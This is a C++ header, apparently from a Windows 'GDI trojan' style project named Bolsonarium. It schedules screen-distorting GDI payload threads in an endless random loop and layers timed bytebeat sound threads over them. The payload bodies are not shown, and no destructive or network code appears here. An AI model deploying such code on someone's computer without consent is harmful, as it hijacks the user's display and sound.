#pragma once

#include "Bolsonarium.h"

int StartEffects = true;

namespace GDIThreads
{
    void GDIThread1()
    {
        HANDLE GDIThread = CreateThread(0, 0, GDIPayloads::GDIShader1, 0, 0, 0);
        Sleep(5000);
        TerminateThread(GDIThread, 0);
    }

    void GDIThread2()
    {
        HANDLE GDIThread = CreateThread(0, 0, GDIPayloads::GDIShader2, 0, 0, 0);
        Sleep(5000);
        TerminateThread(GDIThread, 0);
    }

    void GDIThread3()
    {
        HANDLE GDIThread = CreateThread(0, 0, GDIPayloads::GDIShader3, 0, 0, 0);
        Sleep(5000);
        TerminateThread(GDIThread, 0);
    }

    void GDIThread4()
    {
        HANDLE GDIThread = CreateThread(0, 0, GDIPayloads::GDIShader4, 0, 0, 0);
        Sleep(5000);
        TerminateThread(GDIThread, 0);
    }

    void GDIThread5()
    {
        HANDLE GDIThread = CreateThread(0, 0, GDIPayloads::GDIShader5, 0, 0, 0);
        Sleep(5000);
        TerminateThread(GDIThread, 0);
    }

    void GDIThread6()
    {
        HANDLE GDIThread = CreateThread(0, 0, GDIPayloads::GDIShader6, 0, 0, 0);
        Sleep(5000);
        TerminateThread(GDIThread, 0);
    }

    void GDIThread7()
    {
        HANDLE GDIThread = CreateThread(0, 0, GDIPayloads::GDIShader7, 0, 0, 0);
        Sleep(5000);
        TerminateThread(GDIThread, 0);
    }
}

void (*ThreadList[])() =
{
    GDIThreads::GDIThread1,
    GDIThreads::GDIThread2,
    GDIThreads::GDIThread3,
    GDIThreads::GDIThread4,
    GDIThreads::GDIThread5,
    GDIThreads::GDIThread6,
    GDIThreads::GDIThread7
};

void StartAllThreads()
{
    int AllStages = sizeof(ThreadList) / sizeof(ThreadList[0]);

    while (StartEffects)
    {
        int RandomThread = rand() % AllStages;

        ThreadList[RandomThread]();
    }

    InvalidateRect(0, 0, 1);
}

void StopGDIThreads()
{
    StartEffects = false;
}

void InitPayloads()
{
    Sleep(5000);
    HANDLE FirstThread = CreateThread(0, 0, ExtraPayloads::Statics, 0, 0, 0);
    Sleep(5000);
    EndPayload(FirstThread);

    CreateThread(0, 0, WhileGDI::Texts, 0, 0, 0);
    CreateThread(0, 0, (LPTHREAD_START_ROUTINE)StartAllThreads, 0, 0, 0);
    CreateThread(0, 0, Bytebeats::Sound1, 0, 0, 0);
    Sleep(30000);
    CreateThread(0, 0, Bytebeats::Sound2, 0, 0, 0);
    Sleep(30000);
    CreateThread(0, 0, Bytebeats::Sound3, 0, 0, 0);
    Sleep(30000);
    CreateThread(0, 0, Bytebeats::Sound4, 0, 0, 0);
    Sleep(30000);
    CreateThread(0, 0, Bytebeats::Sound5, 0, 0, 0);
    Sleep(30000);
    CreateThread(0, 0, Bytebeats::Sound6, 0, 0, 0);
    Sleep(30000);
    CreateThread(0, 0, Bytebeats::Sound7, 0, 0, 0);
    Sleep(30000);
    CreateThread(0, 0, Bytebeats::Sound8, 0, 0, 0);
    Sleep(30000);
}